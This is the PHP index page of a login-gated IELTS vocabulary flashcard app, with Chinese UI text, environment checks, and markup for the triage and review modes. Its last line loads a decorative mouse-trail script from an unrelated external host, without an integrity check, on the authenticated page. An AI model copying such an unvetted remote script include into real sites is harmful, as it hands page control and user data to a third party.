<?php
/**
 * index.php —— 页面外壳。只负责渲染骨架，数据全部由 app.js 通过 api.php 取。
 */
declare(strict_types=1);
require __DIR__ . '/auth.php';
require __DIR__ . '/lib.php';

// 密码门。没登录就直接跳走，后面的代码不会执行。
require_login();

// 环境自检：缺词表或缺扩展时给出明确指引，而不是白屏。
$problems = [];
if (!is_file(WORDS_FILE)) {
    $problems[] = '词表文件 <code>data/words.json</code> 不存在。请在项目目录执行 '
        . '<code>python tools/build_words.py</code> 生成，或确认上传时包含了 data 目录。';
}
if (!extension_loaded('pdo_sqlite')) {
    $problems[] = 'PHP 未启用 <code>pdo_sqlite</code> 扩展，进度无法保存。'
        . '请在 php.ini 中打开 <code>extension=pdo_sqlite</code> 后重启 PHP。';
}
if (!is_dir(DATA_DIR) || !is_writable(DATA_DIR)) {
    $problems[] = '目录 <code>data/</code> 不存在或不可写，进度数据库无法创建。请确认上传时包含该目录，'
        . '并赋予写权限，例如 <code>chmod 775 data</code>。';
}

$vc = asset_ver(__DIR__ . '/assets/app.css');
$vj = asset_ver(__DIR__ . '/assets/app.js');
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="robots" content="noindex">
<meta name="app-version" content="<?= APP_VERSION ?>">
<title>雅思背单词</title>
<script>
// 在样式生效前定好主题和模式，避免深色/复习模式下闪一下错误的内容
(function () {
    try {
        var t = localStorage.getItem('ielts.theme');
        if (t !== 'light' && t !== 'dark') {
            t = matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
        }
        document.documentElement.dataset.theme = t;
        var m = localStorage.getItem('ielts.mode');
        document.documentElement.dataset.mode = (m === 'review') ? 'review' : 'triage';
    } catch (e) {
        document.documentElement.dataset.theme = 'light';
        document.documentElement.dataset.mode = 'triage';
    }
})();
</script>
<link rel="stylesheet" href="assets/app.css?v=<?= $vc ?>">
</head>
<body>

<?php if ($problems): ?>
  <div class="setup">
    <h1>还不能开始</h1>
    <ul><?php foreach ($problems as $p): ?><li><?= $p ?></li><?php endforeach; ?></ul>
  </div>
<?php else: ?>

<div class="app" id="app">

  <!-- ================= 顶栏 ================= -->
  <header class="topbar">
    <div class="brand">
      <span class="brand-mark">IELTS</span>
      <span class="brand-name">背单词</span>
    </div>

    <div class="progress">
      <div class="progress-track">
        <div class="progress-fill" id="progressFill"></div>
        <div class="progress-fill-alt" id="progressUnknownFill"></div>
      </div>
      <div class="progress-text" id="progressText">加载中…</div>
    </div>

    <div class="mode-switch" id="modeSwitch" title="切换模式（M）">
      <button class="mode-btn is-active" data-mode="triage">标注</button>
      <button class="mode-btn" data-mode="review">复习</button>
    </div>

    <div class="topbar-actions">
      <button class="btn-ghost" id="btnTheme"   title="切换深浅色（T）">主题</button>
      <button class="btn-ghost danger" id="btnReset" title="清空全部进度（含复习牌组），不可撤销">重置</button>
      <button class="btn-ghost only-mobile" id="btnSidebar" title="词表（L）">词表</button>
      <a class="btn-ghost" href="login.php?action=logout" title="退出登录">退出</a>
    </div>
  </header>

  <!-- ================= 主体 ================= -->
  <main class="stage">

    <!-- ---------- 标注模式卡片区 ---------- -->
    <section class="card-zone triage-only">
      <div class="card" id="card" tabindex="-1">
        <div class="card-meta">
          <span class="pos" id="cardPos">#—</span>
          <span class="chip" id="cardStatus">未标注</span>
          <span class="spacer"></span>
          <button class="chip chip-btn" id="btnMask" title="遮住释义自测（H）">遮住释义</button>
        </div>

        <div class="word" id="cardWord">—</div>
        <div class="ipa"  id="cardIpa"></div>
        <div class="def"  id="cardDef"></div>

        <div class="card-foot" id="cardFoot"></div>
      </div>

      <div class="controls">
        <button class="btn btn-done" id="btnDone">
          <span class="btn-label">DONE</span>
          <span class="btn-sub">认识，移出循环 <kbd>1</kbd></span>
        </button>
        <button class="btn btn-continue" id="btnContinue">
          <span class="btn-label">CONTINUE</span>
          <span class="btn-sub">下一个 <kbd>2</kbd> <kbd>Space</kbd></span>
        </button>
      </div>

      <div class="controls-extra">
        <button class="btn-mini" id="btnUnknown" title="标记为不认识：进入复习牌组，并离开标注循环（3）">
          标记为不认识 <kbd>3</kbd>
        </button>
      </div>

      <p class="hotkeys triage-only">
        <kbd>1</kbd>/<kbd>→</kbd> 认识 ·
        <kbd>2</kbd>/<kbd>←</kbd>/<kbd>Space</kbd> 下一个 ·
        <kbd>3</kbd> 不认识进复习 ·
        <kbd>M</kbd> 去复习 ·
        <kbd>R</kbd> 从头 ·
        <kbd>H</kbd> 遮释义 ·
        <kbd>/</kbd> 搜索
      </p>
    </section>

    <!-- ---------- 复习模式卡片区 ---------- -->
    <section class="card-zone review-only" id="reviewZone">
      <div class="card" id="rcard">
        <div class="card-meta">
          <span class="pos" id="rPos">#—</span>
          <span class="chip" id="rStage">新卡</span>
          <span class="spacer"></span>
          <button class="chip chip-btn" id="btnRMask" title="遮住释义自测（H）">遮住释义</button>
        </div>

        <div class="word" id="rWord">—</div>
        <div class="ipa"  id="rIpa"></div>
        <div class="def"  id="rDef"></div>

        <div class="card-foot" id="rFoot"></div>
      </div>

      <div class="controls controls-3">
        <button class="btn btn-forgot" id="btnForgot">
          <span class="btn-label">忘了</span>
          <span class="btn-sub" id="pvForgot">—</span>
        </button>
        <button class="btn btn-good" id="btnGood">
          <span class="btn-label">记得</span>
          <span class="btn-sub" id="pvGood">—</span>
        </button>
        <button class="btn btn-easy" id="btnEasy">
          <span class="btn-label">简单</span>
          <span class="btn-sub" id="pvEasy">—</span>
        </button>
      </div>

      <p class="hotkeys review-only">
        <kbd>空格</kbd> 显示释义 ·
        <kbd>1</kbd> 忘了 ·
        <kbd>2</kbd> 记得 ·
        <kbd>3</kbd> 简单 ·
        <kbd>H</kbd> 遮释义 ·
        <kbd>U</kbd> 撤销 ·
        <kbd>M</kbd> 回标注
      </p>
    </section>

    <!-- ---------- 标注模式侧栏 ---------- -->
    <aside class="sidebar triage-only" id="sidebar" aria-label="词表">
      <div class="sidebar-head">
        <input type="search" id="search" class="search" placeholder="搜索单词或释义…（/）" autocomplete="off">
        <div class="filters" id="filters">
          <button class="filter is-active" data-filter="all">全部</button>
          <button class="filter" data-filter="left">未标注</button>
          <button class="filter" data-filter="known">已认识</button>
          <button class="filter" data-filter="unknown">不认识</button>
        </div>
        <div class="sidebar-info">
          <span id="listCount">—</span>
          <span class="legend">
            <i class="dot dot-known"></i>认识
            <i class="dot dot-unknown"></i>不认识
            <i class="dot dot-new"></i>未标注
          </span>
          <button class="btn-mini" id="btnRestart" title="跳到第一个还没标注的词（R）">从头开始</button>
        </div>
      </div>

      <div class="list-viewport" id="listViewport">
        <div class="list-spacer" id="listSpacer"><div class="list-layer" id="listLayer"></div></div>
      </div>
    </aside>

    <!-- ---------- 复习模式侧栏 ---------- -->
    <aside class="sidebar review-only" id="rsidebar" aria-label="复习统计">
      <div class="sidebar-head">
        <div class="rstat" id="rStats">加载中…</div>
        <div class="filters">
          <button class="filter" id="btnUndo" title="撤销最近一次评分（U）">撤销上一次</button>
          <button class="filter danger" id="btnSrsReset" title="清空全部复习进度，牌组按当前标注重建">重置复习</button>
        </div>
      </div>
      <div class="list-viewport">
        <div class="rqueue-head">接下来</div>
        <div class="rqueue" id="rQueue"></div>
      </div>

      <div class="rset">
        <div class="rset-head">今日上限</div>
        <label class="rset-row">
          <span class="rset-name">新卡</span>
          <input type="number" id="setNew" min="0" max="9999" step="5" inputmode="numeric" aria-label="今日新卡上限">
        </label>
        <label class="rset-row">
          <span class="rset-name">复习</span>
          <input type="number" id="setRev" min="-1" max="9999" step="10" inputmode="numeric" aria-label="今日复习上限">
        </label>
      </div>
    </aside>

    <div class="scrim" id="scrim"></div>
  </main>
</div>

<div class="toast" id="toast" role="status" aria-live="polite"></div>

<div class="confirm" id="confirm" hidden>
  <div class="confirm-box">
    <h2 id="confirmTitle">清空全部进度？</h2>
    <p id="confirmBody">所有词的“认识 / 不认识”标记都会被删除，回到全新状态。此操作不可撤销，词表本身不受影响。</p>
    <div class="confirm-actions">
      <button class="btn-ghost" id="confirmNo">取消</button>
      <button class="btn-ghost danger" id="confirmYes">确认</button>
    </div>
  </div>
</div>

<script src="assets/app.js?v=<?= $vj ?>" defer></script>

<?php endif; ?>

<script src="https://baf.quoex.moe/mouse-spark-trail.js"></script>
</body>
</html>
